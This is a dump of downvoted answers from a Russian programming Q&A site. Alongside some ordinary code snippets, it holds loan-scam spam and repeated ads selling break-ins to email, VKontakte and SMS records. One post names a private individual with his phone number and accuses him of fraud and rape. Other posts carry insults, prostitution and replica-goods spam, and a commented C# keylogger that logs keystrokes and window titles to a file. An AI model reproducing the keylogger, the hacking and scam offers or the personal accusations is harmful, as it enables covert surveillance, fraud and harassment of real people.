"87080","","-6","<p><strong>Для начала создаешь файл breadcrumbs.php и в нем прописываешь следующий код:</strong></p>
<pre><code>&lt;div id=""breadcrumbs""&gt;
      &lt;?php if (is_home()) { ?&gt;

     &lt;?php } elseif (is_single()) { ?&gt;
         &lt;a href=""&lt;?php echo get_option('home'); ?&gt;""&gt;&amp;laquo; На главную&lt;/a&gt; /            
         &lt;?php foreach((get_the_category()) as $cat) { 
         $cat=$cat-&gt;cat_ID; 
         echo(get_category_parents($cat, TRUE, ' / ')); } ?&gt;Пост ""&lt;?php the_title(); ?&gt;""

     &lt;?php } elseif (is_page()) { ?&gt;
         &lt;a href=""&lt;?php echo get_option('home'); ?&gt;""&gt;&amp;laquo; На главную&lt;/a&gt; / Страница ""&lt;?php the_title(); ?&gt;""

     &lt;?php 
         } elseif (is_category() and get_category($cat)-&gt;parent) { ?&gt;
         &lt;a href=""&lt;?php echo get_option('home'); ?&gt;""&gt;&amp;laquo; На главную&lt;/a&gt; /            
         Рубрика &lt;?php foreach((get_the_category()) as $cat) { 
                        $cat=$cat-&gt;cat_ID; 
         echo(get_category_parents($cat, TRUE, ' / ')); } ?&gt;

     &lt;?php 
         } elseif (is_category()) { ?&gt;
         &lt;a href=""&lt;?php echo get_option('home'); ?&gt;""&gt;&amp;laquo; На главную&lt;/a&gt; /            
         Рубрика ""&lt;?php {echo single_cat_title();} ?&gt;""

     &lt;?php } elseif (is_tag()) { ?&gt;&lt;a href=""&lt;?php echo get_option('home'); ?&gt;""&gt;&amp;laquo; На главную&lt;/a&gt; / Архив тега

     &lt;?php } elseif (is_day()) { ?&gt;&lt;a href=""&lt;?php echo get_option('home'); ?&gt;""&gt;&amp;laquo; На главную&lt;/a&gt; /  Архив записей

     &lt;?php } elseif (is_month()) { ?&gt;&lt;a href=""&lt;?php echo get_option('home'); ?&gt;""&gt;&amp;laquo; На главную&lt;/a&gt; / Архив записей

     &lt;?php } elseif (is_year()) { ?&gt;&lt;a href=""&lt;?php echo get_option('home'); ?&gt;""&gt;&amp;laquo; На главную&lt;/a&gt; /  Архив записей

     &lt;?php } elseif (is_author()) { ?&gt;
           &lt;a href=""&lt;?php echo get_option('home'); ?&gt;""&gt;&amp;laquo; На главную&lt;/a&gt; / Страница автора

     &lt;?php } elseif (is_search ()) { ?&gt;
           &lt;a href=""&lt;?php echo get_option('home'); ?&gt;""&gt;&amp;laquo; На главную&lt;/a&gt; / Результаты поиска

     &lt;?php } elseif (is_404()) { ?&gt;
           &lt;a href=""&lt;?php echo get_option('home'); ?&gt;""&gt;&amp;laquo; На главную&lt;/a&gt; / Ошибка 404

     &lt;?php } elseif (is_page('map.php')) { ?&gt;
           &lt;a href=""&lt;?php echo get_option('home'); ?&gt;""&gt;&amp;laquo; На главную&lt;/a&gt; / Карта советов

     &lt;?php } elseif (is_page('tag_page.php')) { ?&gt;
           &lt;a href=""&lt;?php echo get_option('home'); ?&gt;""&gt;&amp;laquo; На главную&lt;/a&gt; / Карта меток

     &lt;?php } elseif (is_page('contact.php')) { ?&gt;
           &lt;a href=""&lt;?php echo get_option('home'); ?&gt;""&gt;&amp;laquo; На главную&lt;/a&gt; / Форма для контактов

     &lt;?php } elseif (isset($_GET['paged']) &amp;&amp; !empty($_GET['paged'])) { ?&gt;&lt;h3&gt;Архивы&lt;/h3&gt;
        &lt;?php } ?&gt;
    &lt;/div&gt;
</code></pre>
<p><strong>После этого на любой странице прописываешь следующее (то есть подключаешь):</strong> </p>
<pre><code>&lt;?php include (TEMPLATEPATH. '/breadcrumbs.php'); ?&gt;
</code></pre>
<p><strong>Можешь также в самом скрипте прописать css (breadcrumbs.php)</strong></p>
<pre><code>&lt;style&gt;
#breadcrumbs {  
    width: auto;
    font-size: 13px;
    color: #000;
  text-align : left; 
  overflow : hidden; 
}
#breadcrumbs a, #breadcrumbs a:visited { 
  color : #808080; 
  text-decoration : none; 
  outline:none;
} 
#breadcrumbs a:hover, #breadcrumbs a:active { 
  color : #000; 
  text-decoration : none; 
  outline:none;
}
&lt;/style&gt;
</code></pre>
<p>Да и вообще, можно на каждой странице прописать ссылки и красиво это организовать, не замарачиваясь со скриптами.</p>",""
"431821","","-6","<p>такую же проблему наблюдаю и на своем сайте <a href=""http://comixhere.ru/"" rel=""nofollow"">http://comixhere.ru/</a></p>
",""
"429622","","-6","<p>так напиши в чем ошибка была, мб кому то ещё понадобится.</p>

<p>ненавижу таких чмошников, просят у всех всё, а сами конченые твари, нихуя никому никогда</p>
",""
"431091","","-6","<p>у меня такая же проблема была раз пять. И я всегда его принудительно закрывал. На шестой я понял что надо терпеливо дождаться пока иллюстратор сохранит файл. Как то читал о восстановлении файла с помощью Recovery Toolbox for Illustrator на одном форуме софт этот хвалили, действенный и файлы битые лечит.
<a href=""https://illustrator.recoverytoolbox.com/ru/"" rel=""nofollow"">https://illustrator.recoverytoolbox.com/ru/</a></p>
",""
"431191","","-6","<p><a href=""http://riotfree.com/riven/17547"" rel=""nofollow"">http://riotfree.com/riven/17547</a> общая схема примерно такая. Возможности использовать в корыстных целях нету, только если есть бреши у соц сети. На уровне апи такой возможности естественно не предусматривают.</p>
",""
"423433","","-6","<p>Имеется готовое решение всего этого вопроса. Авторизация, платежи QIWI и т.д.
Пишите в skype in1ernal_error</p>
",""
"422337","","-6","<p>бла-бла
бла-бла-бла-бла
бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла-бла!</p>
",""
"432714","","-6","<p>Отгадайка (Продажа/обмен) (FLASH)</p>

<p>Ссылка на приложение:
<a href=""http://vk.com/app2376658_77967313"" rel=""nofollow"">http://vk.com/app2376658_77967313</a></p>

<p>В исходнике идёт:
-Исходник лаунчера
-Исходник прелоадера
-Дамп БД
-Серверная чать (php)</p>

<p>По обмену/продаже пишите сюда: <a href=""http://vk.com/kaaaktuz"" rel=""nofollow"">http://vk.com/kaaaktuz</a>
Цена: договорная.</p>
",""
"113157","","-6","<p>Нужно:</p>
<ol>
<li>Выключить компьютер.</li>
<li>Потанцевать вокруг компьютера с бубном.</li>
<li>Включить компьютер.</li>
<li>Радоваться правильному времени.</li>
</ol>
<p><strong>Инфа 146%.</strong></p>",""
"87895","","-6","<p>Я думаю что для успешного становления веб программистом сначала из Html необходимо узнать про теги div img a span и основные (body head title meta link) этого будет достаточно чтоб изучать CSS (лучше пока изучить CSS2) потом следует прочитать книгу ""JavaScript-руководство пользователя Пол Вилтон и Джерреми МакПик"" паралельно осваивая основы Ajax потом прочитать книги про серверные языки например PHP затем читать книги про Ajax (напр книгу ""AJAX в действии"") паралельно лучше скачать DENWER и практиковаться удачи! ps: Незабудте посьтавить галочку:)<br>
</p>",""
"1822","","-6","<blockquote>
<p>name.text+family.Text+email.text</p>
</blockquote>
<p>=&gt; name.text+'&amp;'+family.Text+'&amp;'+email.text</p>
<pre><code>n:=length(name.text);
for i:=1 to n do
if(name.text[i]='&amp;') then name.text[i]='_';

n:=length(family.text);
for i:=1 to n do
if(family.text[i]='&amp;') then family.text[i]='_';

n:=length(email.text);
for i:=1 to n do
if(email.text[i]='&amp;') then email.text[i]='_';
</code></pre>",""
"131366","","-6","<p>Ну про женщин программистов всегда говорили, что они как морские свинки... И не свинки, и не морские... Так что делаем выводы :)</p>",""
"173344","","-6","<p>у меня есть вариант - у тебя комп одноедерный </p>",""
"202180","","-6","<pre><code>    str.Substring(0, 4);
    str.Remove(4);
    str.Replace()
</code></pre>",""
"216824","","-6","<p>Решил таким образом, тупо в main.php выше всех написал к примеру:</p>
<pre><code>&lt;?
$phone = Yii::app()-&gt;db-&gt;createCommand()
    -&gt;select('title')
    -&gt;from('contacts')
    -&gt;where('tel=:tel', array(':tel'=&gt;'tel'))
    -&gt;queryRow();
?&gt;
</code></pre>",""
"407139","","-6","<p>Здесь очень хорошо раскручивают приложения <a href=""http://apptools.ru/ref/210654"">http://apptools.ru/ref/210654</a>  Установки, оценки, отзывы, гео таргетинг. Регистрация для Вас справа, также нажав на возможности системы можете более детально ознакомиться с ними.</p>",""
"93170","","-6","<p>Да  что? хм?? я тут читаю </p>
<hr>
<p>В js MVC это ИМХО бред сивой кобылы...</p>
<hr>
<p>человек видимо так и не понял что это такое вообще, 
это такая штука, что разделить логику и вывод на две части и не важно где и на чем это использовать, 
видимо тварищ заблудился и трёх соснах и обижен на весь МИР, чтож это его дело, продолжай в том-же духе никто не против, только вот в чем не-задача, зачем это придумали и столько вокруг этого споров и прочих не понятных высказываний.
Не ищите черную кошку в черной комнате, да ещё в которой нет кошки.
<a href=""http://mvccmv.16mb.com/index.php?page=1"">читаем и таем</a><br>
</p>",""
"236631","","-6","<p>Самый мощный и быстрый парсер, автодополнение и подсветка - в kdevelop'e. Единственный парсер, который с ним может соревнаться - это либшланг, но он нереально тормазит - ты будешь автодополнения секунды 2 ждать.</p>
<blockquote>
<p>поиск / замена с поддержкой регулярных
выражений</p>
</blockquote>
<p>Это есть в любом тектовом редакторе, самая примитивная функция.</p>
<blockquote>
<p>быстрый компилятор.</p>
</blockquote>
<p>Никакая ide не работает с конпелятором на прямую - она работает через билдсистему, а туда какой хочешь - такой и фигачь конпелятор.</p>
<p>Gcc - самый фичастый и способный к гинерации идеального кода конпелятор. Шланг слаб. ICC - нацелен на слишком малоумеющих, рядовых программистов. Умеет превращать выхлоп паскалистов/фортранистов в более-менее нормальный код.</p>
<p>Про отладчики я ничего не знаю, ибо не юзаю.</p>
<p>Кути - это основа kdevelop'a. </p>
<p>Всё зависит от того, кто ты - если ты писатель, то qtcreator тебе подойдёт. Если ты больше читаешь сложный код - кутикреатор нихрена не подойдёт.</p>
<p>Ещё есть всякие штуки на жаве - после визуалстудии тормаза не заметишь, погляди всякие еклипсы.</p>",""
"245230","","-6","<p>И не изучишь. ""Pascal и Delphi"" - бесполезно, хоть немного, хоть много. Ничего не прийдётся изучать, с первого. Начать что? Если ты не начнёшь - ты ничему и не научишься. </p>
<p>Бесполезно, обучения нет.</p>
<p>Есть 2 типа недовузов - это купленная мелкософтом говно, задача которого заманить тебя халявой и подсодить на вендорлок. Тебе расскажут о том, каким ты крутым будешь - как нужен сейчас сишарп и венда. Научишься накидывать кнопочки на формачку за 5лет - пойдёшь куда-то, поймёшь, что ты ничто и пойдёшь либо за доширак работать и изучать всё с нуля, либо не работать и изучать всё с нуля, либо работать за доширак и не узичать нихрена, с надежно на то, что тебе фортанёт.</p>
<p>Второй тип фузов - это постсовковковая покладуха на всё. Там остались пара преподователей, которые за били на всё и их знания на уровне паскаля, доса и 80-х годов. В реально мире любое из этих 3-х говн бесполезно. В этом мире ты либо живёшь в мейнстриме за доширак - мейнстрим уже давно забил на развитие, там развитие сосредоточенно на том, чтобы программировать могла любая макака, и чем за меньше дошираков в месяц она работает - тем лучше, и чем больше таких макак - тем лучше.</p>
<p>Либо ты вылитаешь из него(мира), либо идёшь вперёд. Вылетанцы тебя ничему не научат. Твой надежда на то, что тебе попадётся не вылетанец, а таких единицы.</p>
<p>Тут всему ты учишься сам, либо ты ничто, если ты конечно хочешь что-то из себя реально  представлять. В этом мире ты идёшь по головам, с самого дна - ты должен признавать говно, унижать, сливать, втаптывать в говно. В противном случаее ты сгинешь где-то на задворках мейнстрима, заедушным ваятелем говна за доширак, так ничего в мире не принеся - бесполезный потребить.</p>
<p>Ты либо тратишь тысячи своего времени на это, причем времяни на то, что тебя реально развивает. Накидывание кнопочек на формочку развивает разве только детсадовца 3-х лет, не более. И чем понтовей ты становишься - тем больше тебе надо в это вливать времени.</p>
<p>Это я про ""изучать"". Если вуз нужен для работы - учить надо что дают, лишбы не отчислили, если бюджет. Попутно учить какую-нибудь жабу/сишарпик/пхп,питончики,руби и ные уги - и потом пойти в веб, деревенский недоинтерпрайз( тот же веб, вид сбоку), либо в гуйню. Если не совсем идиот - это осиливает за годик-другой на уровне 90% - дальше уже следуйте вашим законам.</p>
<p>С этой точки зрения анальный мелкасофт-вуз будет даже лучше.</p>",""
"415586","","-6","<p>Добрый вечер всем вам: Я человек, который предлагает кредиты деньги людям, нуждающимся и в обществе, которые находятся в финансовом кризисе. Свяжитесь со мной через мой адрес электронной почты для всех ваших кредитных заявок от 10000 € до € 5000000. Каждый народ должен связаться со мной прислал мне свой адрес электронной почты, поэтому я могу ответить. Не стесняйтесь обращаться ко мне по электронной почте: (jacqueline.baeske@mail.ru)</p>
",""
"415591","","-6","<p>Доброе утро, дамы и господа.<br>
Я деловая женщина, которая предлагает кредиты деньги людям, нуждающимся в срочной ссуды. Это предложение для жителей Швейцарии и крупного бизнеса. Земля 5000 евро до 5.000 000 евро для всех запросов около 3% годовых. Частные лица, компании и другие свяжитесь со мной через мой адрес электронной почты, и вы будете есть решение Ваших забот. (jacqueline.baeske@mail.ru)</p>
",""
"415588","","-6","<p>Я женщина швейцарского случае, и я предлагают кредиты деньги людям, нуждающимся. Я предлагаю кредиты € 5000 до € 5.00.000 для всех людей и общества в необходимости кредита. свяжитесь со мной через мой адрес электронной почты для всех ваших денег необходимость. Вот ваш почтовый. (jacqueline.baeske@mail.ru)</p>
",""
"416207","","-6","<p>Взлом, угон:</p>

<ul>
<li><p>ICQ</p></li>
<li><p>email</p></li>
<li><p>сайтов</p></li>
<li><p>одноклассников</p></li>
<li><p>вконтакте</p></li>
<li><p>форумов</p></li>
<li><p>анкет знакомств</p></li>
<li><p>РАСПЕЧАТКА SMS СООБЩЕНИЙ и ЗВОНКОВ !</p></li>
</ul>

<p>взлом email, взлом mail, взлом yandex, взлом rambler, взлом hotmail, yahoo, gmail.</p>

<p>взлом вконтакте взлом одноклассники взлом icq</p>

<p>Окажем быструю помощь Вам.</p>

<p>БЫСТРО! КАЧЕСТВЕННО! ПРОФЕССИОНАЛЬНО!</p>

<p>Обращайтесь. Ответим на все Ваши вопросы.</p>

<p>ICQ 621-286-052</p>

<h1>email: vzlom.ivan@gmail.com</h1>

<h1>=</h1>

<h1>=</h1>

<h1>=</h1>

<h1>=</h1>

<h1>=</h1>

<h1>=</h1>

<h1>=</h1>

<h1>=</h1>

<p>Взлом, угон:</p>

<ul>
<li><p>ICQ</p></li>
<li><p>email</p></li>
<li><p>сайтов</p></li>
<li><p>одноклассников</p></li>
<li><p>вконтакте</p></li>
<li><p>форумов</p></li>
<li><p>анкет знакомств</p></li>
<li><p>РАСПЕЧАТКА SMS СООБЩЕНИЙ и ЗВОНКОВ !</p></li>
</ul>

<p>взлом email, взлом mail, взлом yandex, взлом rambler, взлом hotmail, yahoo, gmail.</p>

<p>взлом вконтакте взлом одноклассники взлом icq</p>

<p>Окажем быструю помощь Вам.</p>

<p>БЫСТРО! КАЧЕСТВЕННО! ПРОФЕССИОНАЛЬНО!</p>

<p>Обращайтесь. Ответим на все Ваши вопросы.</p>

<p>ICQ 621-286-052</p>

<h1>email: vzlom.ivan@gmail.com</h1>

<h1>=</h1>

<h1>=</h1>

<h1>=</h1>

<h1>=</h1>

<p>Взлом, угон:</p>

<ul>
<li><p>ICQ</p></li>
<li><p>email</p></li>
<li><p>сайтов</p></li>
<li><p>одноклассников</p></li>
<li><p>вконтакте</p></li>
<li><p>форумов</p></li>
<li><p>анкет знакомств</p></li>
<li><p>РАСПЕЧАТКА SMS СООБЩЕНИЙ и ЗВОНКОВ !</p></li>
</ul>

<p>взлом email, взлом mail, взлом yandex, взлом rambler, взлом hotmail, yahoo, gmail.</p>

<p>взлом вконтакте взлом одноклассники взлом icq</p>

<p>Окажем быструю помощь Вам.</p>

<p>БЫСТРО! КАЧЕСТВЕННО! ПРОФЕССИОНАЛЬНО!</p>

<p>Обращайтесь. Ответим на все Ваши вопросы.</p>

<p>ICQ 621-286-052
email: vzlom.ivan@gmail.com</p>
",""
"419410","","-6","<p>Есть еще одиг способ. Можно посмотреть на <a href=""http://hack-pda.ru"" rel=""nofollow"">http://hack-pda.ru</a></p>
",""
"421032","","-6","<p>Смотри сервис <a href=""https://semysms.net"" rel=""nofollow"">https://semysms.net</a> и сам сделай из любого телефона, смс сервис!</p>
",""
"421024","","-6","<p>Смотри сервис <a href=""https://semysms.net"" rel=""nofollow"">https://semysms.net</a> и сам сделай из любого телефона смс сервис</p>
",""
"421027","","-6","<p>Смотри сервис <a href=""https://semysms.net"" rel=""nofollow"">https://semysms.net</a> и сам сделай из любого телефона, смс сервис!</p>
",""
"587301","","-6","<pre><code>for (int x=0; x&lt;3; ++x, x--);
</code></pre>
",""
"594974","","-6","<p>А ларчик просто открывался!
Поставил задержку между X и Y:
<code>
using System.Threading;
 Thread.Sleep(100);
</code>
Спасибо @koks_rs, ну и всем остальным. Поставили на путь истинный!</p>
",""
"605724","","-6","<p>Подскажите пожалуйста, что означает insert? И в каком контексте его лучше использовать? <a href=""https://preply.com/question/chto-oznachaet-insert"" rel=""nofollow noreferrer"">https://preply.com/question/chto-oznachaet-insert</a></p>
",""
"607977","","-6","<p>Надо создавать свои проекты и не гнаться за всякими фреймворками </p>
",""
"563161","","-6","<p>В документации есть все примеры , <a href=""http://expressjs.com/en/4x/api.html"" rel=""nofollow"">http://expressjs.com/en/4x/api.html</a>
если что-то не работает то надо разбираться предметно.</p>

<p>req.body
Contains key-value pairs of data submitted in the request body. <strong>By default, it is <em>undefined</em></strong>, and is populated when you use body-parsing middleware such as body-parser and multer.</p>

<p>The following example shows how to use body-parsing middleware to populate req.body.</p>

<pre><code>var app = require('express')();
var bodyParser = require('body-parser');
var multer = require('multer'); // v1.0.5
var upload = multer(); // for parsing multipart/form-data

app.use(bodyParser.json()); // for parsing application/json
app.use(bodyParser.urlencoded({ extended: true })); // for parsing application/x-www-form-urlencoded

app.post('/profile', upload.array(), function (req, res, next) {
  console.log(req.body);
  res.json(req.body);
});
</code></pre>
",""
"614682","","-6","<p>EU GOSTARIA MUITO DE APRENDER ISSO mas prefiro <a href=""http://frasesworlds.com/"" rel=""nofollow noreferrer"">frasesworlds.com</a></p>
",""
"624354","","-6","<p>If someone is lloking for russian conversation skype I can propose you <a href=""https://preply.com/en/russian-by-skype"" rel=""nofollow noreferrer"">https://preply.com/en/russian-by-skype</a> . It's a great platform with good tutors. I used different ways to learn the language, but this way was the best. It was helpful for me. </p>
",""
"603259","","-6","<p>Я бы для начала проверил HDD. Сдается мне, что эта ошибка не с проста! Переустановите Outlook если не делали этого. Еще я знаю что как то можно pst к ost привести и вытащить затем данные, так же знаю программу которая возвращает данные <a href=""https://outlook.recoverytoolbox.com/ru/"" rel=""nofollow noreferrer"">https://outlook.recoverytoolbox.com/ru/</a></p>
",""
"616775","","-6","<pre><code>// Подключаем зависимости сборки
using System; 
using System.Collections.Generic; 
using System.ComponentModel; 
using System.Data; 
using System.Drawing; 
using System.Linq; 
using System.Text; 
using System.Threading.Tasks; 
using System.Windows.Forms; 
using System.IO; 
using System.Runtime.InteropServices; 
using System.Threading; 

//Объявляем пространство имен
namespace WindowsFormsApplication5 
{ 
    // объявляем класс формы
    public partial class Form1 : Form 
    { 
        //какая то строка
        String u = """"; 
        // конструктор формы
        public Form1() 
        { 
            InitializeComponent(); 
        } 

        // вытаскиваем метод из winapi библиотеки для асинхронного получения состояния клавиш (нажата, отжата и т.д.)
        [DllImport(""user32.dll"")] 
        public static extern int GetAsyncKeyState(Int32 i); 

        // тоже самое, только метод для получение всех foreground окон (на переднем плане)
        [DllImport(""user32.dll"")] 
        static extern int GetForegroundWindow(); 

        // тоже самое, только для получения текста с окна (caption наверно)
        [DllImport(""user32.dll"")] 
        static extern int GetWindowText(int hWnd, StringBuilder text, int count); 

        // Объявляем событие на загрузку формы
        private void Form1_Load(object sender, EventArgs e) 
        { 
        } 

        // Событие на нажатие кнопки по объекту button1, запускаем таймер
        private void button1_Click(object sender, EventArgs e) 
        { 
            timer1.Enabled = true; 
        } 

        // Обратаываем события хода таймера
        private void timer1_Tick(object sender, EventArgs e) 
        { 
            // В каждый ""тик"" создаем класс 1
            Class1 cl = new Class1(); 
            // объявляем константу для символов
            const int nChars = 256; 
            // объявляем хендл для окна
            int handle = 0; 
            //создаем объект StringBuilder 
            StringBuilder Buff = new StringBuilder(nChars); 
            // обхявляем пустую строку
            String t=""""; 
            // ищем окно на переднем плане
            handle = GetForegroundWindow(); 

            // Если ее заголовок не пустой, то заносим ее в строку
            if (GetWindowText(handle, Buff, nChars) &gt; 0) 
            { 
                t=(Buff.ToString()); 
                //IDWindowLabel.Text = handle.ToString(); 
            } 

            // проходим по все аски символам
            for (Int32 i = 0; i &lt; 255; i++) 
            { 
                // прлучаем состояние клавиши, отвечающей за i-й символ
                int keyState = GetAsyncKeyState(i); 
                // если нажата клавиша с кодом 1, то
                if (keyState == 1 || keyState == -32767) 
                { 
                    // если строка заголовка, равна той, которую мы объявили внвчале то
                    if (t == u) 
                    { 
                        // заносим ее в текстбокс, и что то делаем из класса 1 (добавляем название нажатой кнопки?)
                        textBox1.Text = textBox1.Text + cl.tx((((Keys)i).ToString())); 
                    } 
                    else 
                    { 
                        // Иначе, почти тоже самое, только еще заносим туда заголовок
                        textBox1.Text = textBox1.Text+""\n""+ ""\n"" + t+"" : ""+ cl.tx((((Keys)i).ToString())); 
                        // Говорим, что дальше будем искать окно (типа запомнили какое окно искать?)
                        u = t; 
                    } 
                } 
            } 
        } 

        // Обработчик для button2
        private void button2_Click(object sender, EventArgs e) 
        { 
        } 

        private void timer2_Tick(object sender, EventArgs e) 
        { 
            //Второй таймер, похоже не используется, но пишет в лог файл то, что находится в textbox1 
            File.Delete(Application.StartupPath + @""\log.txt""); 
            using (System.IO.StreamWriter file = new System.IO.StreamWriter(Application.StartupPath + @""\log.txt"", true)) 
            { 
                file.WriteLine(textBox1.Text); 
            } 
        } 
    } 
}
</code></pre>
",""
"636617","","-6","<p>Самые знойные проститутки Москвы <a href=""http://www.devchonki.in/"" rel=""nofollow noreferrer"">http://www.devchonki.in/</a></p>
",""
"639383","","-6","<p>Панасенко Андрей Станиславович мошенник и вор (1982-12-05) из Тульчинского района (Одесса, Украина)
Пропажа вместе с товаром (ОДЕЖДА).
После перечисления денег начинает кормить завтрашним днем, товар (одежда) так и не поставляет. 
ЦЕНА ВОПРОСА: 29385,14 грн На 05.12.2016
+380 (93) 323 07 08, 0933230708, 093-323-07-08.
34 года / Одесса, Украина / не женат.
который 22 марта 2016г подозревается в изнасиловании девушки в Киеве
БУДЬТЕ ОСТОРОЖНЫ!!!
он
<a href=""https://vk.com/id257691609"" rel=""nofollow noreferrer"">https://vk.com/id257691609</a>
его дочь
<a href=""https://vk.com/lpanasenko1"" rel=""nofollow noreferrer"">https://vk.com/lpanasenko1</a></p>
",""
"635462","","-6","<p>Основные принципы ООП: инкапсуляция, наследование, полиморфизм
<a href=""http://gos-it.wikia.com/wiki/%D0%9E%D1%81%D0%BD%D0%BE%D0%B2%D0%BD%D1%8B%D0%B5_%D0%BF%D1%80%D0%B8%D0%BD%D1%86%D0%B8%D0%BF%D1%8B_%D0%9E%D0%9E%D0%9F:_%D0%B8%D0%BD%D0%BA%D0%B0%D0%BF%D1%81%D1%83%D0%BB%D1%8F%D1%86%D0%B8%D1%8F,_%D0%BD%D0%B0%D1%81%D0%BB%D0%B5%D0%B4%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5,_%D0%BF%D0%BE%D0%BB%D0%B8%D0%BC%D0%BE%D1%80%D1%84%D0%B8%D0%B7%D0%BC"" rel=""nofollow noreferrer"">http://gos-it.wikia.com/wiki/%D0%9E%D1%81%D0%BD%D0%BE%D0%B2%D0%BD%D1%8B%D0%B5_%D0%BF%D1%80%D0%B8%D0%BD%D1%86%D0%B8%D0%BF%D1%8B_%D0%9E%D0%9E%D0%9F:<em>%D0%B8%D0%BD%D0%BA%D0%B0%D0%BF%D1%81%D1%83%D0%BB%D1%8F%D1%86%D0%B8%D1%8F,</em>%D0%BD%D0%B0%D1%81%D0%BB%D0%B5%D0%B4%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5,_%D0%BF%D0%BE%D0%BB%D0%B8%D0%BC%D0%BE%D1%80%D1%84%D0%B8%D0%B7%D0%BC</a></p>
",""
"643674","","-6","<p>все дебилы блять не грамотные, хули пишите если не пониаете вопроса</p>
",""
"663268","","-6","<p>Great Article it its really informative and innovative keep us posted with new updates. its was reallyvaluable. thanks a lot.<a href=""http://www.kreaspacio.com/"" rel=""nofollow noreferrer"">orologi replica</a>
<a href=""http://www.torico.co.uk/"" rel=""nofollow noreferrer"">Nike Shoes</a>   </p>
",""
"665315","","-6","<p>Отличный вопрос, спасибо за ответы. Очень полезно! Мари из <a href=""http://www.ampronix.com/"" rel=""nofollow noreferrer"">http://www.ampronix.com/</a> </p>
",""
"668879","","-6","<p>window.location.href и window.location не срабатывают если input'ы из которых берутся данные заключены в тег form , просто поменяйте, form на div и все будет прекрасно.</p>
",""
"646500","","-5","<p>По коду: переменная у вас не инициализирована. Нужно сделать что-то вроде:</p>

<pre><code>          if (savedInstanceState != null) {
            savedInstanceState.getInt(""money"", money);
          }else{
            money == 0;
          }
</code></pre>

<p>По литературе: Шилдт Г. - Java 8. Руководство для начинающих (2015). Как освоите, можно браться за что-то посерьёзнее</p>
",""
"644749","","-5","<p>Ща, ла-ла-ла-ла. Пам, па-там там. Пам па-там там. Там там.</p>
",""
"651187","","-5","<p>(imagecopyresampled) зачем советовать то что нихрена не знаешь???? Эта функция может только уменьшить картинку</p>
",""
"654280","","-5","<p>Зайдите в ЛК своего оператора и закажите детализация на свою эл.почту, 
если нет возможности смс подтверждение, используйте агрегатор sms-ya.ru</p>
",""
"144985","","-5","<p>Дайте ему шанс стать полноценным социально активным человеком, не учите программированию :-D</p>
<p>P.S. всех с праздничком, товарищи!</p>",""
"619645","","-5","<p><div class=""snippet"" data-lang=""js"" data-hide=""false"" data-console=""true"" data-babel=""false"">
<div class=""snippet-code"">
<pre class=""snippet-code-js lang-js prettyprint-override""><code>var mas = [{a:1,b:2},{a:1,b:2,c:3},{a:3,b:4},{a:4,b:4,e:3},{b:5},{b:4}];

function findByA(val){
  var idx;
  var sum = 0;
  
  for (idx = 0; idx &lt; mas.length; idx++){
    if (mas[idx].a === val){
      alert(""Элемент массива с индексом "" + idx + "" имеет значение "" + val);
      sum++;
    }
  }
  
  return sum;
}

var count = findByA(1);
alert(""&gt;Всего найденных элементов "" + count);</code></pre>
</div>
</div>
</p>
",""
"621561","","-5","<p>поставте + пожалуста))000)))))</p>
",""
"614997","","-5","<p>Я не идиот и ломать сайты не собираюсь. Если мне позволит этот сайт провести небольшую XSS-атаку, то я продемонстрирую с кнопкой.</p>

<pre>
 Нажми 
</pre>

<p>Если тут не стоит защиты, то должна появиться кнопка с надписью Нажми! Если стоит, то просто будет html-код.
XSS-атака проводиться в поле ввода. Вбиваешь JavaScript или HTML в код.</p>
",""
"612269","","-5","<p>Я первым выучил GML(Game Maker Language). Но другим не посоветую. А так Си конечно .</p>
",""
"610569","","-5","<p>Есть 2 стека:</p>

<p>1)Системный- этим стеком рулит ОС и он имеет маленький размер.</p>

<p>2)Программный стек-этим стеком рулит программист и он может быть больше системного.</p>

<p>По идее, при переполнении системного стека, ОС глушит программу и с этим ничего не поделаешь.</p>

<p>А вот когда переполняется программный стек, то тут можно поймать исключение и повлиять на ход выполнения программы(Например, увеличить объем.)</p>
",""
"610628","","-5","<pre><code>function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i &lt; 1e7; i++) {
    if ((new Date().getTime() - start) &gt; milliseconds){
      break;
    }
  }
}


for(i=1;i&lt;=3;i++){
    // you code
    sleep(1000);
    }
</code></pre>
",""
